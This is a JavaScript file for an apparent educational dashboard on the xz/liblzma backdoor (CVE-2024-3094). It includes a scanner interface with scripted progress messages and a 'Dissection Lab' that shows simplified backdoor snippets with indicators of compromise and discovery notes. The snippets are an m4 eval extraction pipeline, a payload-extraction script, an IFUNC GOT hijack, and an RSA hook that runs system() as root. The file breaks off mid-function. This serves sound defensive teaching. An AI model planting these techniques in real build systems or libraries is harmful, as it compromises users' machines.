/* ============================================================
   XZ-Bot Dashboard — Interactive JavaScript
   ============================================================ */

document.addEventListener('DOMContentLoaded', () => {
    initParticles();
    initTabs();
    loadAttackFlow();
    loadTimeline();
    initScanner();
    initDissect();
});

/* ============================================================
   PARTICLE BACKGROUND
   ============================================================ */
function initParticles() {
    const canvas = document.getElementById('particles');
    const ctx = canvas.getContext('2d');
    let particles = [];
    const PARTICLE_COUNT = 60;

    function resize() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    }
    resize();
    window.addEventListener('resize', resize);

    for (let i = 0; i < PARTICLE_COUNT; i++) {
        particles.push({
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height,
            vx: (Math.random() - 0.5) * 0.3,
            vy: (Math.random() - 0.5) * 0.3,
            size: Math.random() * 2 + 0.5,
            opacity: Math.random() * 0.3 + 0.1,
        });
    }

    function draw() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);

        particles.forEach(p => {
            p.x += p.vx;
            p.y += p.vy;
            if (p.x < 0) p.x = canvas.width;
            if (p.x > canvas.width) p.x = 0;
            if (p.y < 0) p.y = canvas.height;
            if (p.y > canvas.height) p.y = 0;

            ctx.beginPath();
            ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
            ctx.fillStyle = `rgba(88, 166, 255, ${p.opacity})`;
            ctx.fill();
        });

        // Draw connections
        for (let i = 0; i < particles.length; i++) {
            for (let j = i + 1; j < particles.length; j++) {
                const dx = particles[i].x - particles[j].x;
                const dy = particles[i].y - particles[j].y;
                const dist = Math.sqrt(dx * dx + dy * dy);
                if (dist < 120) {
                    ctx.beginPath();
                    ctx.moveTo(particles[i].x, particles[i].y);
                    ctx.lineTo(particles[j].x, particles[j].y);
                    ctx.strokeStyle = `rgba(88, 166, 255, ${0.06 * (1 - dist / 120)})`;
                    ctx.lineWidth = 0.5;
                    ctx.stroke();
                }
            }
        }

        requestAnimationFrame(draw);
    }
    draw();
}

/* ============================================================
   TAB NAVIGATION
   ============================================================ */
function initTabs() {
    document.querySelectorAll('.tab').forEach(tab => {
        tab.addEventListener('click', () => {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            tab.classList.add('active');
            const section = document.getElementById(tab.dataset.tab);
            section.classList.add('active');
        });
    });
}

/* ============================================================
   ATTACK FLOW
   ============================================================ */
function loadAttackFlow() {
    fetch('/api/stages')
        .then(r => r.json())
        .then(stages => {
            const diagram = document.getElementById('flow-diagram');
            diagram.innerHTML = '';
            stages.forEach((stage, i) => {
                if (i > 0) {
                    const arrow = document.createElement('div');
                    arrow.className = 'flow-arrow';
                    arrow.innerHTML = `<svg viewBox="0 0 32 16"><path d="M0 8 L24 8" stroke="#30363d" stroke-width="2" fill="none"/><path d="M20 4 L28 8 L20 12" stroke="#58a6ff" stroke-width="2" fill="none"/></svg>`;
                    diagram.appendChild(arrow);
                }
                const node = document.createElement('div');
                node.className = 'flow-node';
                node.style.animationDelay = `${i * 0.1}s`;
                node.innerHTML = `
                    <div class="node-number">${stage.order}</div>
                    <div class="node-title">${stage.name}</div>
                `;
                node.addEventListener('click', () => showStageDetail(stage, node));
                diagram.appendChild(node);
            });
        });
}

function showStageDetail(stage, node) {
    document.querySelectorAll('.flow-node').forEach(n => n.classList.remove('selected'));
    node.classList.add('selected');

    const panel = document.getElementById('stage-detail');
    const indicatorsHtml = stage.indicators.map(i => `<li>${escHtml(i)}</li>`).join('');
    const mitigationsHtml = stage.mitigations.map(m => `<li>${escHtml(m)}</li>`).join('');

    panel.innerHTML = `
        <div class="detail-header">
            <span class="stage-badge">STAGE ${stage.order}</span>
            <h3>${escHtml(stage.name)}</h3>
        </div>
        <div class="detail-body">
            <p>${escHtml(stage.description)}</p>
            <h4>Technical Detail</h4>
            <div class="tech-block">${escHtml(stage.technical_detail)}</div>
            <h4>Indicators of Compromise</h4>
            <ul>${indicatorsHtml}</ul>
            <h4>Mitigations</h4>
            <ul>${mitigationsHtml}</ul>
        </div>
    `;
    panel.style.animation = 'none';
    panel.offsetHeight; // trigger reflow
    panel.style.animation = 'fadeIn 0.4s ease';
}

/* ============================================================
   SCANNER — Animated multi-agent scan
   ============================================================ */
const AGENTS = ['supply_chain', 'backdoor', 'obfuscation', 'social_engineering'];
const AGENT_LABELS = {
    supply_chain: 'Supply Chain',
    backdoor: 'Backdoor',
    obfuscation: 'Obfuscation',
    social_engineering: 'Social Eng',
};

function initScanner() {
    document.getElementById('scan-btn').addEventListener('click', () => {
        const path = document.getElementById('scan-path').value.trim();
        runScan(path);
    });
    document.getElementById('scan-samples-btn').addEventListener('click', () => {
        runScan('');
    });
    document.querySelectorAll('.filter-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            filterFindings(btn.dataset.filter);
        });
    });
}

function resetAgentCards() {
    AGENTS.forEach(agent => {
        const card = document.querySelector(`.agent-card[data-agent="${agent}"]`);
        card.className = 'agent-card glass';
        document.getElementById(`status-${agent}`).textContent = 'IDLE';
        document.getElementById(`status-${agent}`).className = 'agent-status';
        document.getElementById(`progress-${agent}`).style.width = '0%';
        document.getElementById(`findings-${agent}`).textContent = '--';
    });
}

function runScan(targetPath) {
    const scanBtn = document.getElementById('scan-btn');
    const btnText = scanBtn.querySelector('.btn-text');
    const btnSpinner = scanBtn.querySelector('.btn-spinner');
    const activityFeed = document.getElementById('activity-feed');
    const feedLog = document.getElementById('feed-log');
    const results = document.getElementById('scan-results');

    // Reset UI
    resetAgentCards();
    scanBtn.disabled = true;
    document.getElementById('scan-samples-btn').disabled = true;
    btnText.style.display = 'none';
    btnSpinner.style.display = 'inline-block';
    activityFeed.style.display = 'flex';
    results.style.display = 'none';
    feedLog.innerHTML = '';

    addFeedEntry('orchestrator', 'Initializing agentic scan pipeline...');

    // Simulate progressive agent activity while real scan runs
    const scanPromise = fetch('/api/scan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target_path: targetPath }),
    }).then(r => r.json());

    simulateAgentProgress(scanPromise);
}

async function simulateAgentProgress(scanPromise) {
    const phases = [
        { agent: 'supply_chain', msgs: [
            'Walking build system files...',
            'Scanning Makefile, configure.ac...',
            'Checking m4 macros for injection patterns...',
            'Analyzing post-install hooks...',
        ]},
        { agent: 'backdoor', msgs: [
            'Scanning C/C++ source files...',
            'Checking for IFUNC resolver abuse...',
            'Analyzing dlsym/RTLD_NEXT patterns...',
            'Checking GOT/PLT manipulation...',
            'Flagging RSA_public_decrypt hooks...',
        ]},
        { agent: 'obfuscation', msgs: [
            'Computing Shannon entropy for test fixtures...',
            'Checking for multi-layer deobfuscation pipelines...',
            'Analyzing base64/hex encoding patterns...',
        ]},
        { agent: 'social_engineering', msgs: [
            'Loading git commit history...',
            'Analyzing contributor trust progression...',
            'Checking for sockpuppet pressure patterns...',
            'Evaluating scope escalation timeline...',
        ]},
    ];

    let scanData = null;

    // Animate each agent
    for (const phase of phases) {
        const card = document.querySelector(`.agent-card[data-agent="${phase.agent}"]`);
        const statusEl = document.getElementById(`status-${phase.agent}`);
        const progressEl = document.getElementById(`progress-${phase.agent}`);

        card.classList.add('scanning');
        statusEl.textContent = 'SCANNING';
        statusEl.className = 'agent-status active';

        for (let i = 0; i < phase.msgs.length; i++) {
            addFeedEntry(AGENT_LABELS[phase.agent], phase.msgs[i]);
            progressEl.style.width = `${((i + 1) / phase.msgs.length) * 100}%`;
            await sleep(300 + Math.random() * 200);
        }

        card.classList.remove('scanning');
        card.classList.add('done');
        statusEl.textContent = 'COMPLETE';
        statusEl.className = 'agent-status complete';
        progressEl.style.width = '100%';
    }

    // Cross-reference phase
    addFeedEntry('orchestrator', 'Cross-referencing findings across agents...');
    document.getElementById('feed-status').textContent = 'Cross-referencing...';

    for (const agent of AGENTS) {
        const card = document.querySelector(`.agent-card[data-agent="${agent}"]`);
        const statusEl = document.getElementById(`status-${agent}`);
        card.classList.remove('done');
        card.classList.add('xref');
        statusEl.textContent = 'XREF';
        statusEl.className = 'agent-status xref';
        await sleep(200);
    }

    await sleep(400);

    addFeedEntry('orchestrator', 'Correlating IFUNC + crypto function patterns...', 'critical');
    await sleep(300);
    addFeedEntry('orchestrator', 'Correlating obfuscated data + build injection...', 'critical');
    await sleep(300);
    addFeedEntry('orchestrator', 'Correlating backdoor code + supply chain injection...', 'critical');
    await sleep(200);

    // Wait for actual scan to finish
    try {
        scanData = await scanPromise;
    } catch (err) {
        alert('Scan failed: ' + err.message);
        return;
    }

    // Update agent finding counts
    if (scanData.agent_reports) {
        for (const [name, count] of Object.entries(scanData.agent_reports)) {
            const el = document.getElementById(`findings-${name}`);
            if (el) animateCount(el, count);
        }
    }

    addFeedEntry('orchestrator', `Scan complete. Risk score: ${scanData.risk_score.toFixed(1)}/10`, scanData.risk_score >= 8 ? 'critical' : 'finding');
    document.getElementById('feed-status').textContent = 'Complete';
    document.getElementById('feed-status').style.animation = 'none';

    // Re-enable buttons
    document.getElementById('scan-btn').disabled = false;
    document.getElementById('scan-samples-btn').disabled = false;
    const btnText = document.getElementById('scan-btn').querySelector('.btn-text');
    const btnSpinner = document.getElementById('scan-btn').querySelector('.btn-spinner');
    btnText.style.display = 'inline';
    btnSpinner.style.display = 'none';

    // Show results with animation
    renderScanResults(scanData);
}

function addFeedEntry(agent, msg, severity) {
    const log = document.getElementById('feed-log');
    const entry = document.createElement('div');
    const now = new Date();
    const time = `${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}.${now.getMilliseconds().toString().padStart(3, '0').slice(0, 2)}`;
    entry.className = `feed-entry${severity ? ' ' + severity : ''}`;
    entry.innerHTML = `
        <span class="feed-time">${time}</span>
        <span class="feed-agent">[${escHtml(agent)}]</span>
        <span class="feed-msg">${escHtml(msg)}</span>
    `;
    log.appendChild(entry);
    log.scrollTop = log.scrollHeight;
}

function renderScanResults(data) {
    const results = document.getElementById('scan-results');
    results.style.display = 'block';
    results.style.animation = 'fadeIn 0.5s ease';

    // Animate gauge
    animateGauge(data.risk_score);

    // Severity bars
    renderSeverityBars(data.severity_counts || {});

    // Category rings
    renderCategoryRings(data.findings || []);

    // Findings count
    document.getElementById('findings-count').textContent = data.total_findings;

    // Findings table
    renderFindingsTable(data.findings || []);
}

function animateGauge(score) {
    const arc = document.getElementById('gauge-arc');
    const scoreText = document.getElementById('gauge-score');
    const labelText = document.getElementById('gauge-label');
    const maxDash = 251.2;
    const targetDash = (score / 10) * maxDash;

    let labels = ['LOW RISK', 'MEDIUM RISK', 'HIGH RISK', 'CRITICAL'];
    let label = score <= 3 ? labels[0] : score <= 6 ? labels[1] : score <= 8 ? labels[2] : labels[3];

    const duration = 1500;
    const start = performance.now();

    function animate(now) {
        const elapsed = now - start;
        const progress = Math.min(elapsed / duration, 1);
        const eased = 1 - Math.pow(1 - progress, 3); // ease-out cubic
        const current = eased * score;
        arc.setAttribute('stroke-dasharray', `${(current / 10) * maxDash} ${maxDash}`);
        scoreText.textContent = current.toFixed(1);
        if (progress < 1) requestAnimationFrame(animate);
        else labelText.textContent = label;
    }
    requestAnimationFrame(animate);
}

function renderSeverityBars(counts) {
    const container = document.getElementById('severity-bars');
    const levels = [
        { key: 'critical', label: 'Critical', color: '#da3633' },
        { key: 'high', label: 'High', color: '#f85149' },
        { key: 'medium', label: 'Medium', color: '#d29922' },
        { key: 'low', label: 'Low', color: '#388bfd' },
        { key: 'info', label: 'Info', color: '#8b949e' },
    ];

    const maxCount = Math.max(...Object.values(counts), 1);
    container.innerHTML = levels.map(lev => {
        const count = counts[lev.key] || 0;
        const pct = (count / maxCount) * 100;
        return `
            <div class="sev-row">
                <span class="sev-name" style="color:${lev.color}">${lev.label}</span>
                <div class="sev-bar-track">
                    <div class="sev-bar-fill" style="background:${lev.color};width:${pct}%"></div>
                </div>
                <span class="sev-count" style="color:${lev.color}">${count}</span>
            </div>
        `;
    }).join('');

    // Animate bars in after a tick
    setTimeout(() => {
        container.querySelectorAll('.sev-bar-fill').forEach(bar => {
            bar.style.transition = 'width 0.8s cubic-bezier(0.4, 0, 0.2, 1)';
        });
    }, 50);
}

function renderCategoryRings(findings) {
    const cats = {};
    findings.forEach(f => {
        cats[f.category] = (cats[f.category] || 0) + 1;
    });

    const total = findings.length || 1;
    const colors = {
        supply_chain: '#d29922',
        backdoor: '#f85149',
        obfuscation: '#a371f7',
        social_engineering: '#58a6ff',
    };

    const container = document.getElementById('category-rings');
    container.innerHTML = Object.entries(cats).map(([cat, count]) => {
        const pct = count / total;
        const circumference = 2 * Math.PI * 22;
        const dashLen = pct * circumference;
        const color = colors[cat] || '#8b949e';
        return `
            <div class="cat-ring">
                <svg class="cat-ring-svg" viewBox="0 0 56 56">
                    <circle cx="28" cy="28" r="22" class="cat-ring-track"/>
                    <circle cx="28" cy="28" r="22" class="cat-ring-fill" stroke="${color}" stroke-dasharray="${dashLen} ${circumference}"/>
                </svg>
                <div class="cat-ring-count" style="color:${color}">${count}</div>
                <div class="cat-ring-label">${cat.replace('_', ' ')}</div>
            </div>
        `;
    }).join('');
}

let allFindings = [];

function renderFindingsTable(findings) {
    allFindings = findings;
    const tbody = document.getElementById('findings-body');
    tbody.innerHTML = '';

    findings.forEach((f, i) => {
        const row = document.createElement('tr');
        row.className = 'expandable';
        row.dataset.severity = f.severity;
        row.innerHTML = `
            <td><span class="sev-badge sev-${f.severity}">${f.severity}</span></td>
            <td>${escHtml(f.rule_id)}</td>
            <td>${escHtml(f.category)}</td>
            <td>${escHtml(f.title)}</td>
            <td>${f.file_path ? escHtml(f.file_path.split('/').pop()) : '-'}</td>
            <td>${f.line_number || '-'}</td>
        `;
        row.addEventListener('click', () => {
            const ev = document.getElementById(`evidence-${i}`);
            if (ev) ev.classList.toggle('show');
        });
        tbody.appendChild(row);

        const evRow = document.createElement('tr');
        evRow.className = 'evidence-row';
        evRow.id = `evidence-${i}`;
        evRow.dataset.severity = f.severity;
        evRow.innerHTML = `
            <td colspan="6" class="evidence-cell">
                <strong>${escHtml(f.description)}</strong>
                <code>${escHtml(f.evidence)}</code>
                <em>Recommendation: ${escHtml(f.recommendation)}</em>
            </td>
        `;
        tbody.appendChild(evRow);
    });
}

function filterFindings(filter) {
    const rows = document.querySelectorAll('#findings-body tr');
    rows.forEach(row => {
        if (filter === 'all' || row.dataset.severity === filter) {
            row.style.display = '';
        } else {
            row.style.display = 'none';
        }
    });
}

/* ============================================================
   DISSECTION LAB
   ============================================================ */
const DISSECT_LAYERS = [
    {
        title: 'Layer 1: Build System Injection',
        filename: 'build-to-host.m4',
        lang: 'm4',
        code: [
            { n: 1, text: '# build-to-host.m4 — LEGITIMATE GNU macro', cls: 'comment' },
            { n: 2, text: 'AC_DEFUN([gl_BUILD_TO_HOST],', cls: '' },
            { n: 3, text: '[', cls: '' },
            { n: 4, text: '  gl_cv_host_os=$(uname -s)', cls: '' },
            { n: 5, text: '', cls: '' },
            { n: 6, text: '  # --- INJECTED PAYLOAD (tarball only) ---', cls: 'highlight-line comment' },
            { n: 7, text: '  if test -f tests/files/bad-3-corrupt_lzma2.xz; then', cls: 'highlight-line danger' },
            { n: 8, text: '    eval $(sed "s/-.*//" tests/files/bad-3-corrupt_lzma2.xz \\', cls: 'highlight-line danger' },
            { n: 9, text: '      | tr "\\t \\-_" " \\t_\\-" \\', cls: 'highlight-line danger' },
            { n: 10, text: '      | head -c 7966 \\', cls: 'highlight-line danger' },
            { n: 11, text: '      | xz -d 2>/dev/null)', cls: 'highlight-line danger' },
            { n: 12, text: '  fi', cls: 'highlight-line danger' },
            { n: 13, text: '', cls: '' },
            { n: 14, text: '  gl_cv_build_to_host="$gl_cv_host_os"', cls: '' },
            { n: 15, text: '])', cls: '' },
        ],
        explain: `<p>The attack begins in the <strong>autotools build system</strong>. A modified m4 macro in <code>build-to-host.m4</code> was only present in release tarballs, not in the git repository.</p>
<p>This is the first stage of a multi-layer extraction pipeline:</p>
<div class="step"><span class="step-num">1.</span> The macro checks for a "test fixture" file</div>
<div class="step"><span class="step-num">2.</span> <code>sed</code> strips header bytes from the disguised payload</div>
<div class="step"><span class="step-num">3.</span> <code>tr</code> performs character substitution to restore original bytes</div>
<div class="step"><span class="step-num">4.</span> <code>head -c 7966</code> extracts exactly the right number of bytes</div>
<div class="step"><span class="step-num">5.</span> <code>xz -d</code> decompresses the LZMA-compressed payload</div>
<div class="step"><span class="step-num">6.</span> <code>eval</code> executes the resulting shell script</div>`,
        ioc: [
            'Tarball contents differ from git repository',
            'Shell pipeline in m4 macro: sed | tr | head | xz -d',
            'eval() of dynamically generated code in build scripts',
            'References to test fixture files in build logic',
        ],
    },
    {
        title: 'Layer 2: Payload Extraction Pipeline',
        filename: 'extracted_stage1.sh',
        lang: 'bash',
        code: [
            { n: 1, text: '#!/bin/bash', cls: '' },
            { n: 2, text: '# Stage 1 extracted script (deobfuscated)', cls: 'comment' },
            { n: 3, text: '', cls: '' },
            { n: 4, text: '# Activation guards — only triggers on target systems', cls: 'comment' },
            { n: 5, text: 'if [ "$(uname)" != "Linux" ]; then exit 0; fi', cls: 'highlight-line' },
            { n: 6, text: 'if [ "$(uname -m)" != "x86_64" ]; then exit 0; fi', cls: 'highlight-line' },
            { n: 7, text: 'if [ -n "$TERM" ]; then exit 0; fi  # skip interactive', cls: 'highlight-line danger' },
            { n: 8, text: '', cls: '' },
            { n: 9, text: '# Extract second-stage payload from test fixture', cls: 'comment' },
            { n: 10, text: 'payload_file="tests/files/good-large_compressed.lzma"', cls: 'highlight-line danger' },
            { n: 11, text: '', cls: '' },
            { n: 12, text: '# Multi-step deobfuscation of embedded object code', cls: 'comment' },
            { n: 13, text: 'xz -dc "$payload_file" | {', cls: 'highlight-line danger' },
            { n: 14, text: '  head -c "$offset" > /dev/null', cls: 'highlight-line danger' },
            { n: 15, text: '  head -c "$size" > liblzma_la-crc64-fast.o', cls: 'highlight-line danger' },
            { n: 16, text: '}', cls: 'highlight-line' },
            { n: 17, text: '', cls: '' },
            { n: 18, text: '# Inject compiled object into build', cls: 'comment' },
            { n: 19, text: 'cp liblzma_la-crc64-fast.o "$builddir/.libs/"', cls: 'highlight-line danger' },
        ],
        explain: `<p>The extracted shell script is a <strong>7-layer matryoshka</strong> (nesting doll) of obfuscation. Each layer peels back to reveal the next.</p>
<p>Key anti-analysis features:</p>
<div class="step"><span class="step-num">1.</span> <strong>OS guard:</strong> Only runs on Linux x86_64</div>
<div class="step"><span class="step-num">2.</span> <strong>Interactive guard:</strong> Skips if TERM is set (avoids developer machines)</div>
<div class="step"><span class="step-num">3.</span> <strong>Test fixture disguise:</strong> Payload hidden in "test data" files</div>
<div class="step"><span class="step-num">4.</span> <strong>Offset extraction:</strong> Uses exact byte offsets to extract ELF object</div>
<div class="step"><span class="step-num">5.</span> <strong>Build injection:</strong> Replaces legitimate crc64-fast.o with backdoored version</div>
<p>The test files had entropy of <strong>~7.99 bits/byte</strong> (near-maximum), compared to ~6.8 for legitimate LZMA test data.</p>`,
        ioc: [
            'Files with Shannon entropy > 7.5 bits/byte',
            'Byte-exact extraction with head -c',
            'Self-referential decompression (xz decoding itself)',
            'Object file replacement in build directory',
            'Conditional exit based on TERM environment variable',
        ],
    },
    {
        title: 'Layer 3: IFUNC Resolver Hijack',
        filename: 'crc64_fast.c',
        lang: 'c',
        code: [
            { n: 1, text: '#include <lzma.h>', cls: '' },
            { n: 2, text: '#include <dlfcn.h>', cls: '' },
            { n: 3, text: '', cls: '' },
            { n: 4, text: '/* Normal IFUNC — selects CRC implementation */', cls: 'comment' },
            { n: 5, text: 'static crc64_func_t crc64_resolve(void) {', cls: 'safe-line' },
            { n: 6, text: '    if (__builtin_cpu_supports("clmul"))', cls: 'safe-line' },
            { n: 7, text: '        return crc64_clmul;', cls: 'safe-line' },
            { n: 8, text: '    return crc64_generic;', cls: 'safe-line' },
            { n: 9, text: '}', cls: '' },
            { n: 10, text: '', cls: '' },
            { n: 11, text: '/* BACKDOORED IFUNC — also patches GOT */', cls: 'highlight-line comment' },
            { n: 12, text: 'static crc64_func_t crc64_resolve(void) {', cls: 'highlight-line' },
            { n: 13, text: '    if (__builtin_cpu_supports("clmul"))', cls: 'highlight-line' },
            { n: 14, text: '        _backdoor_init();  // <-- INJECTED', cls: 'highlight-line danger' },
            { n: 15, text: '    return crc64_clmul;', cls: 'highlight-line' },
            { n: 16, text: '}', cls: '' },
            { n: 17, text: '', cls: '' },
            { n: 18, text: 'void _backdoor_init(void) {', cls: 'highlight-line' },
            { n: 19, text: '    /* Walk GOT to find RSA_public_decrypt */', cls: 'highlight-line comment' },
            { n: 20, text: '    void **got = find_got_entry("RSA_public_decrypt");', cls: 'highlight-line danger' },
            { n: 21, text: '    original_rsa = *got;', cls: 'highlight-line danger' },
            { n: 22, text: '    *got = backdoor_rsa_public_decrypt;', cls: 'highlight-line danger' },
            { n: 23, text: '}', cls: '' },
        ],
        explain: `<p><strong>GNU IFUNC</strong> (Indirect Function) is a legitimate mechanism for selecting optimized function implementations at load time, before <code>main()</code> runs.</p>
<p>The backdoor abuses this by adding GOT (Global Offset Table) patching to the IFUNC resolver:</p>
<div class="step"><span class="step-num">1.</span> Dynamic linker calls <code>crc64_resolve()</code> during library load</div>
<div class="step"><span class="step-num">2.</span> Resolver runs <code>_backdoor_init()</code> before any security tools start</div>
<div class="step"><span class="step-num">3.</span> Init walks the GOT to find <code>RSA_public_decrypt</code> in libcrypto</div>
<div class="step"><span class="step-num">4.</span> Replaces the pointer with <code>backdoor_rsa_public_decrypt</code></div>
<div class="step"><span class="step-num">5.</span> All future calls to RSA_public_decrypt are now intercepted</div>
<p>This works because <strong>sshd loads liblzma via libsystemd</strong>, and the IFUNC runs before sshd's own initialization.</p>`,
        ioc: [
            'IFUNC resolver that does more than CPU feature detection',
            'GOT/PLT modifications from within a compression library',
            'Cross-library function pointer replacement',
            'Code executing before main() via IFUNC',
        ],
    },
    {
        title: 'Layer 4: RSA Hook & Crypto Abuse',
        filename: 'backdoor_rsa.c',
        lang: 'c',
        code: [
            { n: 1, text: '/* Hooked RSA_public_decrypt — replaces OpenSSL\'s */', cls: 'comment' },
            { n: 2, text: 'int backdoor_rsa_public_decrypt(', cls: 'highlight-line' },
            { n: 3, text: '    int flen, const uint8_t *from,', cls: 'highlight-line' },
            { n: 4, text: '    uint8_t *to, RSA *rsa, int padding)', cls: 'highlight-line' },
            { n: 5, text: '{', cls: '' },
            { n: 6, text: '    /* Extract attacker payload from RSA modulus */', cls: 'highlight-line comment' },
            { n: 7, text: '    BIGNUM *n = RSA_get0_n(rsa);', cls: 'highlight-line danger' },
            { n: 8, text: '    uint8_t *modulus = BN_bn2bin(n);', cls: 'highlight-line danger' },
            { n: 9, text: '', cls: '' },
            { n: 10, text: '    /* Verify Ed448 signature from attacker */', cls: 'comment' },
            { n: 11, text: '    if (!verify_ed448(modulus, attacker_pubkey))', cls: 'highlight-line danger' },
            { n: 12, text: '        return original_rsa(flen, from, to, rsa, padding);', cls: 'highlight-line' },
            { n: 13, text: '', cls: '' },
            { n: 14, text: '    /* Decrypt command with ChaCha20 */', cls: 'comment' },
            { n: 15, text: '    uint8_t *cmd = chacha20_decrypt(modulus + 64);', cls: 'highlight-line danger' },
            { n: 16, text: '', cls: '' },
            { n: 17, text: '    /* Execute as root (sshd runs as root) */', cls: 'highlight-line comment' },
            { n: 18, text: '    system(cmd);  // PRE-AUTH RCE', cls: 'highlight-line danger' },
            { n: 19, text: '', cls: '' },
            { n: 20, text: '    return original_rsa(flen, from, to, rsa, padding);', cls: '' },
            { n: 21, text: '}', cls: '' },
        ],
        explain: `<p>The hooked <code>RSA_public_decrypt</code> inspects every SSH certificate presented during authentication. When it finds the attacker's signature, it executes a hidden command.</p>
<div class="step"><span class="step-num">1.</span> SSH client sends certificate with crafted RSA modulus (N field)</div>
<div class="step"><span class="step-num">2.</span> Hooked function extracts payload from the modulus bytes</div>
<div class="step"><span class="step-num">3.</span> <strong>Ed448</strong> signature verifies the payload is from the attacker (not random data)</div>
<div class="step"><span class="step-num">4.</span> <strong>ChaCha20</strong> decrypts the embedded command</div>
<div class="step"><span class="step-num">5.</span> <code>system()</code> executes the command as root</div>
<p>Using Ed448 + ChaCha20 (not in standard SSH) means the backdoor is <strong>cryptographically authenticated</strong> — only the attacker can trigger it.</p>`,
        ioc: [
            'RSA_public_decrypt hooked in compression library',
            'Ed448 signature verification (unusual for SSH)',
            'ChaCha20 decryption in non-TLS context',
            'system() call from within crypto path',
        ],
    },
    {
        title: 'Layer 5: Pre-Auth Remote Code Execution',
        filename: 'kill_chain.txt',
        lang: 'diagram',
        code: [
            { n: 1, text: '  ATTACKER                        TARGET (sshd)', cls: 'comment' },
            { n: 2, text: '  --------                        --------------', cls: 'comment' },
            { n: 3, text: '', cls: '' },
            { n: 4, text: '  1. Craft SSH certificate', cls: '' },
            { n: 5, text: '     +---------------------------+', cls: '' },
            { n: 6, text: '     | RSA Modulus (N field):     |', cls: 'highlight-line' },
            { n: 7, text: '     |  [Ed448 sig][ChaCha20 cmd]|', cls: 'highlight-line danger' },
            { n: 8, text: '     +---------------------------+', cls: 'highlight-line' },
            { n: 9, text: '', cls: '' },
            { n: 10, text: '  2. SSH connect -------------------------------->', cls: '' },
            { n: 11, text: '                                   sshd receives cert', cls: '' },
            { n: 12, text: '', cls: '' },
            { n: 13, text: '  3. sshd calls RSA_public_decrypt()', cls: '' },
            { n: 14, text: '     (actually calls backdoor_rsa_public_decrypt)', cls: 'highlight-line danger' },
            { n: 15, text: '', cls: '' },
            { n: 16, text: '  4. Backdoor verifies Ed448 signature', cls: 'highlight-line' },
            { n: 17, text: '     Backdoor decrypts ChaCha20 payload', cls: 'highlight-line' },
            { n: 18, text: '     Backdoor calls system("attacker_cmd")', cls: 'highlight-line danger' },
            { n: 19, text: '', cls: '' },
            { n: 20, text: '  5. RESULT: Pre-auth RCE as root', cls: 'highlight-line danger' },
            { n: 21, text: '     CVE-2024-3094 | CVSS 10.0 | CRITICAL', cls: 'highlight-line danger' },
            { n: 22, text: '', cls: '' },
            { n: 23, text: '  DISCOVERED: Andres Freund (Microsoft)', cls: 'safe-line' },
            { n: 24, text: '  Noticed 500ms SSH login delay due to CPU usage', cls: 'safe-line' },
            { n: 25, text: '  from the backdoor code running in hot path', cls: 'safe-line' },
        ],
        explain: `<p>The complete kill chain results in <strong>CVE-2024-3094</strong>, rated <strong>CVSS 10.0 Critical</strong> — pre-authentication remote code execution as root on any system running the affected sshd.</p>
<div class="step"><span class="step-num">1.</span> Attacker connects to SSH with a specially crafted certificate</div>
<div class="step"><span class="step-num">2.</span> The RSA modulus carries an Ed448-signed, ChaCha20-encrypted command</div>
<div class="step"><span class="step-num">3.</span> The hooked RSA_public_decrypt runs <strong>before authentication</strong></div>
<div class="step"><span class="step-num">4.</span> Command executes as root (sshd privilege level)</div>
<div class="step"><span class="step-num">5.</span> Normal SSH handshake continues — no visible error</div>
<p><strong>Discovery:</strong> Andres Freund at Microsoft noticed a <strong>500ms delay</strong> in SSH logins on a Debian testing machine. He traced the CPU overhead to liblzma and uncovered the entire backdoor. A performance regression saved the internet.</p>`,
        ioc: [
            'Unusual SSH authentication latency (~500ms)',
            'SSH certificates with abnormal RSA modulus sizes',
            'system() calls during pre-auth SSH phase',
            'Ed448/ChaCha20 usage in SSH code path',
            'liblzma loaded into sshd process space',
        ],
    },
];

function initDissect() {
    document.querySelectorAll('.layer-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            document.querySelectorAll('.layer-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            renderDissectLayer(parseInt(btn.dataset.layer));
        });
    });
    renderDissectLayer(0);
}

function renderDissectLayer(idx) {
    const layer = DISSECT_LAYERS[idx];

    document.getElementById('dissect-filename').textContent = layer.filename;
    document.getElementById('dissect-lang').textContent = layer.lang;
    document.getElementById('dissect-title').textContent = layer.title;
    document.getElementById('dissect-body').innerHTML = layer.explain;

    // Code block
    const codeBlock = document.getElementById('dissect-codeblock');
    codeBlock.innerHTML = layer.code.map(line => {
        const cls = line.cls || '';
        const spanCls = cls.includes('comment') ? 'comment' :
                        cls.includes('danger') ? 'danger' :
                        cls.includes('keyword') ? 'keyword' : '';
        const wrapCls = cls.includes('highlight-line') ? 'highlight-line' :
                        cls.includes('safe-line') ? 'safe-line' : '';

        const content = `<span class="line-num">${line.n}</span><span class="${spanCls}">${escHtml(line.text)}</span>`;
        if (wrapCls) {
            return `<span class="${wrapCls}">${content}\n</span>`;
        }
        return content + '\n';
    }).join('');

    // IOC list
    const iocList = document.getElementById('dissect-ioc-list');
    iocList.innerHTML = layer.ioc.map(i => `<li>${escHtml(i)}</li>`).join('');
}

/* ============================================================
   TIMELINE
   ============================================================ */
function loadTimeline() {
    fetch('/api/timeline')
        .then(r => r.json())
        .then(events => {
            const container = document.getElementById('timeline-container');
            container.innerHTML = '';
            let lastPhase = '';
            events.forEach((event, i) => {
                const el = document.createElement('div');
                el.className = `timeline-event ${event.phase}`;
                el.style.animationDelay = `${i * 0.08}s`;

                let phaseLabel = '';
                if (event.phase !== lastPhase) {
                    const phaseNames = {
                        trust_building: 'Trust Building',
                        injection: 'Injection',
                        exploitation: 'Exploitation',
                        discovery: 'Discovery',
                    };
                    phaseLabel = `<span class="timeline-phase-label ${event.phase}">${phaseNames[event.phase] || event.phase}</span>`;
                    lastPhase = event.phase;
                }

                el.innerHTML = `
                    <div class="timeline-dot ${event.phase}"></div>
                    ${phaseLabel}
                    <div class="timeline-date">${event.date}</div>
                    <div class="timeline-title">${escHtml(event.title)}</div>
